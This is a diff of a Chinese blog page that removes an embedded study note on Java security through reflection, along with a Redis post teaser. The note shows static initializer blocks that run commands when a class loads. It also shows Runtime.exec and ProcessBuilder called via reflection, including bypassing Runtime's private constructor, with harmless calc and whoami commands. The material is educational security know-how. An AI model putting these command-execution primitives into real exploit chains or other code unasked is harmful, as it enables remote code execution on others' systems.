-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="java安全-反射学习"><a href="#java安全-反射学习" class="headerlink" title="java安全,反射学习"></a>java安全,反射学习</h2><p>加入了p神的知识星球之后,通过p神发的java安全漫谈学习Java安全,p神讲解很好,恶补了java反射有关知识后,将知识点和代码自己边写边理解一遍</p>
-<hr>
-<p>java中反射赋予了java动态的特性</p>
-<p>Class.forName()可以通过类的路径获取到一个类</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(className)  <span class="comment">//这个可以理解为下一个的封装</span></span><br><span class="line"><span class="comment">//等于</span></span><br><span class="line">Class.forName(className,<span class="keyword">true</span>,currentLoader)</span><br><span class="line">    <span class="comment">//第一个参数是类名,第二个参数表示是否初始化,第三个参数是ClassLoader</span></span><br></pre></td></tr></table></figure>
-
-<p>Java默认的 ClassLoader 就是根据类名来加载类， 这个类名是类完整路径，如 java.lang.Runtime </p>
-<h4 id="类中”初始化方法”的调用顺序与区别"><a href="#类中”初始化方法”的调用顺序与区别" class="headerlink" title="类中”初始化方法”的调用顺序与区别"></a>类中”初始化方法”的调用顺序与区别</h4><ul>
-<li><p><code>static&#123;&#125;</code>静态代码块在”类初始化”的时候调用</p>
-</li>
-<li><p><code>&#123;&#125;</code>代码块的内容会在父类构造函数<code>super()</code>之后调用</p>
-</li>
-<li><p>最后调用构造函数</p>
-</li>
-</ul>
-<p>还记得学java的时候说super必须写在构造函数的第一行</p>
-<hr>
-<p>**Person p = new Person(“zhangsan”,20); 该句话都做了什么事情？ **</p>
-<p>1，因为new用到了Person.class.所以会先找到Person.class文件并加载到内存中。 </p>
-<p>2，执行该类中的static代码块，如果有的话，给Person.class类进行初始化。</p>
-<p>3，在堆内存中开辟空间，分配内存地址。 </p>
-<p>4，在堆内存中建立对象的特有属性。并进行默认初始化。 </p>
-<p>5，对属性进行显示初始化。 </p>
-<p>6，对对象进行构造代码块初始化。 </p>
-<p>7，对对象进行对应的构造函数初始化。 </p>
-<p>8，将内存地址付给栈内存中的p变量。</p>
-<hr>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainPrint</span> </span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;类内代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TrainPrint</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在获取类对象的时候静态代码块就会执行</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//需要抛出一个类找不到的异常</span></span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.reflect.test.TrainPrint&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220301221808194.png" alt="image-20220301221808194"></p>
-<p><strong>注:如果在forName获取Class对象的时候将是否初始化关闭(也就是 第二个参数 为 <code>false</code>),则不会执行静态代码块</strong></p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220307130344019.png" alt="image-20220307130344019"></p>
-<p>剩下两个”初始化方法”必须在实例化的时候才会调用</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//需要抛出一个类找不到的异常</span></span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.reflect.test.TrainPrint&quot;</span>);</span><br><span class="line">            Object o = aClass.newInstance();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行后的顺序</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220301222222222.png" alt="image-20220301222222222"></p>
-<h4 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h4><p>综上所述,其中静态代码块可以写入恶意代码从而在”类初始化”的时候调用</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exeCommand</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            runtime.exec(<span class="string">&quot;cmd /C calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过加载该类就可以执行<code>static&#123;&#125;</code>中的代码</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exe</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.reflect.test.exeCommand&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="调用类中的方法执行恶意代码"><a href="#调用类中的方法执行恶意代码" class="headerlink" title="调用类中的方法执行恶意代码"></a>调用类中的方法执行恶意代码</h3><p>在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不 需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。</p>
-<p>ava的普通类 C1 中支持编写内部类 C2 ，而在编译的时候，会生成两个文件： C1.class 和 C1$C2.class ，我们可以把他们看作两个无关的类，通过 Class.forName(“C1$C2”) 即可加载这个内 部类。 </p>
-<p>获得类以后，我们可以继续使用反射来获取这个类中的属性、方法，也可以实例化这个类，并调用方 法。</p>
-<p><code>class.newInstance()</code> 的作用就是调用这个类的无参构造函数，这个比较好理解。不过，我们有时候 在写漏洞利用方法的时候，会发现使用 <code>newInstance</code> 总是不成功，这时候原因可能是：</p>
-<ul>
-<li>类没有无参构造函数</li>
-<li>类的构造函数是私有的</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">runtime</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">            aClass.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(aClass.newInstance(),<span class="string">&quot;cmd /C whoami&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>会报一个这样的错</p>
-<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220302002903587.png" alt="image-20220302002903587"></p>
-<p>为什么会将构造方法设置为private呢</p>
-<p>很常见的一个设计模式就是”单例模式”</p>
-<p>比如对于web应用来说,数据库只需要建立一次连接,而不是每次用到数据库的时候再建立一个连接,此时就可以将数据库连接使用的类的构造方法设置为私有,再通过一个static方法来获取</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">connection</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> connection instance=<span class="keyword">new</span> connection();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> connection <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">connection</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;数据库连接建立&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这样只有类初始化的时候会执行一个构造函数,后面只能通过<code>getInstance</code>获取这个对象,避免建立多个数据库连接</p>
-<p>Runtime类就是”单例模式”,只能通过<code>Runtime.getRuntime()</code>来获取到<code>Runtime</code>对象</p>
-<p>对代码做出修改之后成功执行命令</p>
-<p>其中<code>aClass.getMethod(&quot;getRuntime&quot;).invoke(aClass)</code>,用来获取Runtime对象</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">            aClass.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(aClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(aClass),<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="两个问题"><a href="#两个问题" class="headerlink" title="两个问题"></a>两个问题</h3><h4 id="如果一个类没有无参构造方法-也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？"><a href="#如果一个类没有无参构造方法-也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？" class="headerlink" title="如果一个类没有无参构造方法,也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？"></a>如果一个类没有无参构造方法,也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？</h4><p>需要使用到getConstructor()方法获取无参构造函数,因为构造函数也支持重载,所以必须用参数列表类型才能唯一确定一个构造函数</p>
-<p>比如经常使用的另一种执行命令的类ProcessBuilder,使用反射来获取其有参的构造函数,然后调用<code>start()</code>来执行命令</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processBuilder</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        ((ProcessBuilder)aClass.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>))).start();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果不能强制类型转换的时候,利用反射的getMethod和invoke来执行</p>
-<p>通过 getMethod(“start”) 获取到start方法，然后 invoke 执行， invoke 的第一个参数就是 ProcessBuilder Object了。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aClass.getMethod(<span class="string">&quot;start&quot;</span>).invoke(aClass.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>)));</span><br></pre></td></tr></table></figure>
-
-<p>那么，如果我们要使用 <code>public ProcessBuilder(String... command) </code>这个构造函数，需要怎样用反 射执行呢？</p>
-<p>这个<code>String... command</code>参数表示可变长参数,在Java中编译的时候会编译成一个数组</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aClass.getMethod(<span class="string">&quot;start&quot;</span>).invoke(aClass.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;));</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="如果一个方法或构造方法是私有方法，我们是否能执行它呢？"><a href="#如果一个方法或构造方法是私有方法，我们是否能执行它呢？" class="headerlink" title="如果一个方法或构造方法是私有方法，我们是否能执行它呢？"></a>如果一个方法或构造方法是私有方法，我们是否能执行它呢？</h4><p>此时就需要getDeclared系列的反射了</p>
-<ul>
-<li><p>getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法 </p>
-</li>
-<li><p>getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了</p>
-</li>
-</ul>
-<p>之前提到过,Runtime的构造方法时私有的,现在可以通过getDeclaredConstructor来获取这个私有的构造方法,使用setAccessible(true)来设置私有方法的作用域来调用它</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">declar</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor();</span><br><span class="line">        declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        aClass.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(declaredConstructor.newInstance(),<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/17/centos%E5%AE%89%E8%A3%85redis6.2.6/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
-      <meta itemprop="name" content="blueSatchel">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="blueSatchel's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/02/17/centos%E5%AE%89%E8%A3%85redis6.2.6/" class="post-title-link" itemprop="url">Redis6.2.6在Centos7上的安装过程</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-02-17 18:54:54 / 修改时间：14:51:53" itemprop="dateCreated datePublished" datetime="2022-02-17T18:54:54+08:00">2022-02-17</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/redis/" itemprop="url" rel="index"><span itemprop="name">redis</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Redis6-2-6在Centos7上的安装过程"><a href="#Redis6-2-6在Centos7上的安装过程" class="headerlink" title="Redis6.2.6在Centos7上的安装过程"></a>Redis6.2.6在Centos7上的安装过程</h1>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/02/17/centos%E5%AE%89%E8%A3%85redis6.2.6/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1623,7 +1598,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">55</span>
+          <span class="site-state-item-count">57</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
